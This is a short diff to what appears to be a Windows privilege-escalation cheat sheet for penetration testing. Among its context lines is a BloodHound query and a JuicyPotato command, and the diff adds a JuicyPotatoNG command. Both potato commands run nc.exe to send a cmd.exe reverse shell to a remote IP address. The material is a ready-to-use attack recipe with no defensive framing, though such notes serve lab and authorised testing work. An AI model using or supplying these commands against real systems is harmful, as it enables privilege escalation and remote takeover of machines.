@@ -69,6 +69,8 @@ MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
 
 ```
 potato86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.119.160 4321" -t *
+# PotatoNG https://github.com/antonioCoco/JuicyPotatoNG
+JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "nc.exe 192.168.49.131 21 -e c:\windows\system32\cmd.exe"
 ```
 
 ### SAM (Security Account Manager)
